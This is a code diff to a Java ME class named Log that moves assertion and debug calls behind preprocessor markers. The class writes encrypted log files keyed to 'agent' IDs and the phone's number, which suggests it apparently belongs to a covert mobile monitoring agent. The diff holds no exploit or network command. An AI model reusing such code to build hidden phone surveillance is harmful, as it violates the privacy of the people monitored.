@@ -80,13 +80,16 @@ public class Log {
 
     public static int convertTypeLog(int agentId) {
         int agentPos = agentId - Agent.AGENT;
-        Check.requires(TYPE_LOG != null, "Null TypeLog");
+        // #ifdef DBC
+//@                Check.requires(TYPE_LOG != null, "Null TypeLog");
+        // #endif
         if (agentPos > 0 && agentPos < TYPE_LOG.length) {
             int typeLog = TYPE_LOG[agentPos];
             return typeLog;
         }
 
-        debug.warn("Wrong agentId conversion: " + agentId);
+        // #debug
+                debug.warn("Wrong agentId conversion: " + agentId);
         return LogType.UNKNOWN;
     }
 
@@ -186,7 +189,9 @@ public class Log {
         }
 
         Vector tuple = logCollector.makeNewName(this, agent);
-        Check.asserts(tuple.size() == 4, "Wrong tuple size");
+        // #ifdef DBC
+//@                Check.asserts(tuple.size() == 4, "Wrong tuple size");
+        // #endif
 
         this.progressive = ((Integer) tuple.elementAt(0)).intValue();
         String basePath = (String) tuple.elementAt(1);
@@ -197,26 +202,32 @@ public class Log {
         Path.createDirectory(dir);
 
         fileName = dir + encName;
-        Check.asserts(fileName != null, "null fileName");
+        // #ifdef DBC
+//@                Check.asserts(fileName != null, "null fileName");
+        // #endif
 
         try {
             fconn = (FileConnection) Connector.open(fileName);
 
             if (fconn.exists()) {
-                debug.fatal("It should not exist:" + fileName);
+                // #debug
+                                debug.fatal("It should not exist:" + fileName);
                 return false;
             }
 
             byte[] plainBuffer = makeDescription(additionalData);
-            Check.asserts(plainBuffer.length >= 32 + additionalLen,
-                    "Short plainBuffer");
+            // #ifdef DBC
+//@                        Check.asserts(plainBuffer.length >= 32 + additionalLen,"Short plainBuffer");
+            // #endif
 
             fconn.create();
             os = fconn.openDataOutputStream();
 
             byte[] encBuffer = encryption.encryptData(plainBuffer);
-            Check.asserts(encBuffer.length == Encryption
-                    .getNextMultiple(plainBuffer.length), "Wrong encBuffer");
+            // #ifdef DBC
+//@                        Check.asserts(encBuffer.length == 
+//@                        Encryption.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
+            // #endif
 
             // scriviamo la dimensione dell'header paddato
             os.write(Utils.intToByteArray(plainBuffer.length));
@@ -224,11 +235,14 @@ public class Log {
             os.write(encBuffer);
             os.flush();
 
-            Check.asserts(fconn.fileSize() == encBuffer.length + 4,
-                    "Wrong filesize");
+            // #ifdef DBC
+//@                        Check.asserts(fconn.fileSize() == encBuffer.length + 4,"Wrong filesize");
+            // #endif
 
-            debug.trace("plainBuffer.length: " + plainBuffer.length);
-            debug.trace("encBuffer.length: " + encBuffer.length);
+            // #debug
+                        debug.trace("plainBuffer.length: " + plainBuffer.length);
+            // #debug
+                        debug.trace("encBuffer.length: " + encBuffer.length);
 
         } catch (IOException ex) {
             return false;
@@ -263,8 +277,9 @@ public class Log {
         logDescription.sourceIdLen = device.getWPhoneNumber().length;
 
         byte[] baseHeader = logDescription.getBytes();
-        Check.asserts(baseHeader.length == logDescription.length,
-                "Wrong log len");
+        // #ifdef DBC
+//@                Check.asserts(baseHeader.length == logDescription.length,"Wrong log len");
+        // #endif
 
         int headerLen = baseHeader.length + logDescription.additionalData
                 + logDescription.deviceIdLen + logDescription.userIdLen
@@ -315,7 +330,8 @@ public class Log {
      */
     public boolean writeLog(byte[] data) {
         if (os == null || fconn == null) {
-            debug.error("fconn or os null");
+            // #debug
+                        debug.error("fconn or os null");
             return false;
         }
 
